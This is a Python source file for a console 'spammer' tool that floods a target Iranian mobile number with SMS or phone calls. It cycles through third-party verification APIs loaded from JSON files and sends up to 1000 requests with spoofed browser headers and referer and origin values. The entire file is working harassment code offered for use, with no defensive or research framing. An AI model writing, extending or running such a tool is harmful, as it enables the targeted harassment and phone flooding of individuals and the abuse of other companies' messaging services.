import itertools
import json
import re
import time
from pathlib import Path
from typing import Any, ClassVar, Dict, Optional
from urllib.parse import urlsplit

import requests
from requests.exceptions import RequestException, Timeout

from .console import ConsoleUI
from .messages import Message


class Spammer:
    """A class for handling spam operations"""

    _option: ClassVar[Optional[str]] = None
    _phone_number: ClassVar[Optional[str]] = None
    _repetition: ClassVar[Optional[int]] = None

    VALID_OPTIONS: ClassVar[Dict[str, str]] = {"1": "handle_sms", "2": "handle_call"}
    PHONE_PATTERN: ClassVar[re.Pattern] = re.compile(r'^9\d{9}$')  # Iranian mobile numbers, no leading 0
    MAX_MESSAGE_REPETITION: ClassVar[int] = 1000
    REQUEST_TIMEOUT_SECONDS: ClassVar[int] = 5
    REQUEST_DELAY_SECONDS: ClassVar[float] = 0.1

    # Static browser-like headers merged into every outgoing request
    DEFAULT_HEADERS: ClassVar[Dict[str, str]] = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
        'Content-Type': 'application/json',
        'sec-ch-ua': '"Not_A Brand";v="24", "Chromium";v="96"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin'
    }

    @classmethod
    def clear(cls) -> None:
        """Clear the screen and reset all class variables"""
        ConsoleUI.clear_screen()
        cls._option = None
        cls._phone_number = None
        cls._repetition = None

    @classmethod
    def run(cls) -> None:
        """Main program loop"""
        try:
            while True:
                cls.clear()
                ConsoleUI.display_banner()
                ConsoleUI.display_menu()
                cls.get_option()
        except KeyboardInterrupt:
            print(Message.show_exit())
        except Exception as e:
            print(Message.show_error(f"An unexpected error occurred: {str(e)}"))

    @classmethod
    def get_option(cls) -> None:
        """Get and validate user option"""
        cls._option = input(ConsoleUI.format_styled("info", "Enter the option (1/2 or q to quit): "))

        if cls._option.lower() == 'q':
            raise KeyboardInterrupt

        if cls._option not in cls.VALID_OPTIONS:
            print(Message.show_error("Invalid option!"))
            Message.prompt_refresh()
            return

        # Call the corresponding method using dictionary mapping
        method = getattr(cls, cls.VALID_OPTIONS[cls._option])
        method()

    @classmethod
    def validate_phone_number(cls, phone: str) -> bool:
        """
        Validate phone number format

        Args:
            phone: Phone number to validate

        Returns:
            bool: True if valid, False otherwise
        """
        return bool(cls.PHONE_PATTERN.match(phone))

    @classmethod
    def get_phone_number(cls) -> None:
        """Get and validate phone number from user"""
        while True:
            phone = input(ConsoleUI.format_styled("info", "Enter the phone number (9XXXXXXXXX): "))

            if cls.validate_phone_number(phone):
                cls._phone_number = phone
                break
            else:
                print(Message.show_error("Invalid phone number! Format: 9XXXXXXXXX"))
                if not Message.confirm_action("Try again?"):
                    raise KeyboardInterrupt

    @classmethod
    def get_repetition(cls) -> None:
        """Get and validate repetition count from user"""
        while True:
            try:
                rep = input(ConsoleUI.format_styled("info", f"Enter number of messages (max {cls.MAX_MESSAGE_REPETITION}): "))
                repetition = int(rep)
                if 1 <= repetition <= cls.MAX_MESSAGE_REPETITION:
                    cls._repetition = repetition
                    break
                print(Message.show_error(f"Please enter a number between 1 and {cls.MAX_MESSAGE_REPETITION}"))
            except ValueError:
                print(Message.show_error("Please enter a valid number"))

            if not Message.confirm_action("Try again?"):
                raise KeyboardInterrupt

    @classmethod
    def load_services(cls, service_type: str) -> Dict[str, Any]:
        """
        Load API services from JSON file

        Args:
            service_type: Type of service ('sms' or 'call')

        Returns:
            dict: API services configuration
        """
        try:
            base_dir = Path(__file__).parent
            file_path = base_dir / 'data' / f'{service_type}_services.json'

            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            print(Message.show_error(f"Services file not found: {service_type}_services.json"))
            return {}
        except json.JSONDecodeError:
            print(Message.show_error(f"Invalid JSON in services file: {service_type}_services.json"))
            return {}

    @classmethod
    def send_request(cls, service_type: str) -> None:
        """
        Send requests to various APIs

        Args:
            service_type: Type of service ('sms' or 'call')
        """
        message_index = 0
        target_number = cls._phone_number

        api_services = cls.load_services(service_type)
        if not api_services:
            print(Message.show_error("No services available"))
            Message.prompt_refresh()
            return

        max_attempts = cls._repetition * len(api_services)
        attempts = 0
        for api_name, api_service in itertools.cycle(api_services.items()):
            if message_index >= cls._repetition or attempts >= max_attempts:
                break
            attempts += 1

            try:
                api_url = api_service["url"].format(phone=target_number)
                method = api_service.get("method", "post").lower()

                headers = cls.DEFAULT_HEADERS.copy()
                if "headers" in api_service:
                    headers.update(api_service["headers"])

                api_data = cls.format_data(api_service["data"], target_number)

                # Add referer and origin based on URL
                parsed_url = urlsplit(api_url)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                headers.update({
                    'referer': f"{base_url}/",
                    'origin': base_url
                })

                # Send request based on method
                if method == "get":
                    response = requests.get(
                        api_url,
                        params=api_data,  # Use params for GET requests
                        headers=headers,
                        timeout=cls.REQUEST_TIMEOUT_SECONDS
                    )
                else:
                    response = requests.post(
                        api_url,
                        json=api_data,
                        headers=headers,
                        timeout=cls.REQUEST_TIMEOUT_SECONDS
                    )

                status = "success" if response.ok else "warning"
                print(ConsoleUI.format_styled(
                    status,
                    f"Send {service_type.upper()} +1 ({message_index+1}/{cls._repetition}) ({api_name}) -> {response.reason}"
                ))

                if response.ok:
                    message_index += 1

            except Timeout:
                print(ConsoleUI.format_styled(
                    "error",
                    f"Timeout for {api_name}"
                ))
                continue

            except RequestException:
                print(ConsoleUI.format_styled(
                    "error",
                    f"Failed for {api_name}"
                ))
                continue

            except KeyError:
                print(ConsoleUI.format_styled(
                    "error",
                    f"Invalid service configuration for {api_name}"
                ))
                continue

            except Exception:
                print(ConsoleUI.format_styled(
                    "error",
                    f"Unexpected error for {api_name}"
                ))
                continue

            time.sleep(cls.REQUEST_DELAY_SECONDS)

        if message_index < cls._repetition:
            print(ConsoleUI.format_styled("*", "Your API services do not have the capacity for the entered value."))
        ConsoleUI.display_heart()
        print(ConsoleUI.format_styled("#", f"{service_type.upper()} sent successfully (:"))
        Message.prompt_refresh()

    @classmethod
    def format_data(cls, data: Dict[str, Any], phone: str) -> Dict[str, Any]:
        """Format request data, handling nested dictionaries"""
        formatted: Dict[str, Any] = {}
        for key, value in data.items():
            if isinstance(value, dict):
                formatted[key] = cls.format_data(value, phone)
            elif isinstance(value, str):
                formatted[key] = value.format(phone=phone)
            else:
                formatted[key] = value
        return formatted

    @classmethod
    def handle_sms(cls) -> None:
        """Handle SMS spam operation"""
        try:
            cls.get_phone_number()
            cls.get_repetition()
            cls.send_request('sms')
        except KeyboardInterrupt:
            print("\n" + Message.show_info("SMS operation cancelled"))
            Message.prompt_refresh()

    @classmethod
    def handle_call(cls) -> None:
        """Handle call spam operation"""
        try:
            cls.get_phone_number()
            cls.get_repetition()
            cls.send_request('call')
        except KeyboardInterrupt:
            print("\n" + Message.show_info("Call operation cancelled"))
            Message.prompt_refresh()
